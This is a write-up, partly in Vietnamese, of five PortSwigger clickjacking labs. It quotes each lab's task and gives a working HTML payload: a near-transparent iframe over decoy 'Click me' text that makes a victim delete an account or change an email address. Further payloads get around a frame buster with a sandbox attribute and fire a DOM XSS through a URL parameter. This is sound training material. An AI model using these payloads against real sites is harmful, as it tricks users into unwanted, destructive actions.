# [Portswigger] Clickjacking

***

## 1. Lab: Basic clickjacking with CSRF token protection

* Content:
```
This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.

To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.

You can log in to your own account using the following credentials: wiener:peter
```
* Exploit:

Dùng payload sau cho vào Exloit Server:
```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 500px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0a90004b0435b5e0b296118200d200a0.web-security-academy.net/my-account"></iframe>
```

Khi view Exploit ta sẽ thấy phần chữ "Click" ở đúng vi trí của "Delete Account"

<img width="355" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4406580c-ec8f-4054-a46c-5489dba2189a">

LAB SOLVED!

<img width="594" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/532f04d4-86bb-49a1-aae0-af88ae23fa1f">

***

## 2. Lab: Clickjacking with form input data prefilled from a URL parameter

* Content:
```
This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.

To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter
```
* Exploit:

Dùng payload sau, prefill trước parametter email (bằng GET method trong link URL) để content email được fill vào trước trong ô input:

```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://0ab8008003451981827cb51f00e80071.web-security-academy.net/my-account/?email=ndkhai%40test1.net"></iframe>
```

<img width="355" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7b696408-947b-4852-9014-ac9488c97b6b">

Chuyển nội dung từ `Test me` =>  `Click me` rồi Deliver To Victim => LAB SOLVED!

<img width="579" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/69331c6a-49c9-4164-ad29-534592a14448">

***

## 3. Lab: Clickjacking with a frame buster script

* Content:
```
This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?

To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.

You can log in to your own account using the following credentials: wiener:peter
```
* Exploit:

Dùng payload sau: (Khác phần trước ở chỗ dùng thêm thuộc tính `sandbox="allow-forms"` trong iframe)

```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 600px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 450px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe sandbox="allow-forms" src="https://0a2d0099031ec49780ad30ec008e0031.web-security-academy.net/my-account?email=ndkhai@1.1"></iframe>
```

<img width="374" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/353f2ee8-b908-428d-9a8f-6cbbe4096253">

LAB SOLVED!

<img width="576" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7c5249ba-2882-4164-a1d9-94bc58fba983">

***

## 4. Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

* Content:
```
This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.
```
*Exploit:

Dùng payload sau:

```
<style>
    iframe {
        position:relative;
        width: 700px;
        height: 1000px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 850px;
        left: 60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a8a00f80303c4c480124e8f00b3006e.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=wiener%40admin-user.net&subject=3&message=4"></iframe>
```

<img width="318" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1c0d4bfb-b81d-487b-9ac0-55ef5d016b70">

LAB SOLVED!

<img width="581" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3725fcce-9957-48f9-a4a3-cd2301b16da5">

***

## 5. Lab: Multistep clickjacking

* Content:
```
This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

You can log in to the account yourself using the following credentials: wiener:peter
```
* Exploit:

Dùng payload:

```
<style>
	iframe {
		position:relative;
		width: 700px;
		height: 700px;
		opacity: 0.0001;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top: 500px;
		left: 60px;
		z-index: 1;
	}
   .secondClick {
		top: 300px;
		left: 250px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a67007b0495e21280a6a8a8008900a1.web-security-academy.net/my-account"></iframe>
```

<img width="370" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/11ac09de-87e2-4562-897f-e2cd78b08905">

LAB SOLVED!

<img width="580" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3cd8898d-0172-4a22-b179-9d472749ec36">
